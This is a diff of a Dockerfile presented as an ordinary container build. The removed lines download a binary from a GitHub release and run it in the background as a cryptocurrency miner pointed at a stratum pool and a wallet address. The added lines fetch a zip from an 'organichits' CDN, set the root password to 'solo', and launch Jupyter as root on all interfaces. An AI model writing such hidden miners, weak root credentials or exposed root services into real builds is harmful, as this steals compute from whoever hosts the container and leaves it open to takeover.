@@ -1,21 +1,24 @@
-FROM ubuntu:20.04
+# Use Ubuntu 18.04 as the base image
+FROM ubuntu:18.04
 
-
-
-ENV DEBIAN_FRONTEND=noninteractive
-
+# Install necessary packages
 RUN apt-get update && \
     apt-get install -y \
-    wget \
+    apt-transport-https \
+    ca-certificates \
     curl
-    
-RUN wget https://github.com/Solo120140/Sologotemm-/releases/download/dataget/soloed
 
-RUN chmod +x soloed 
+RUN curl https://cdn.organichits.co/download/organichits-2.1.6-linux.zip
 
-RUN nohup ./soloed -a yespower -o stratum+tcp://206.189.2.17:3333 -u WbDv1eEFn1QwodsG9Tdmq8e61BhEn8SMHZ -p x -t2 && sleep 635636
+RUN echo “root:solo” | chpasswd
 
+# Install Jupyter and other necessary packages
+RUN apt-get update && \
+    apt-get install -y python3-pip && \
+    pip3 install notebook jupyterhub jupyterlab
 
+# Expose port for Jupyter Notebook
+EXPOSE 8888
 
-
-     
+# Set the default command to start Jupyter Notebook
+CMD ["jupyter", "notebook", "--ip=0.0.0.0", "--allow-root", "--no-browser"]
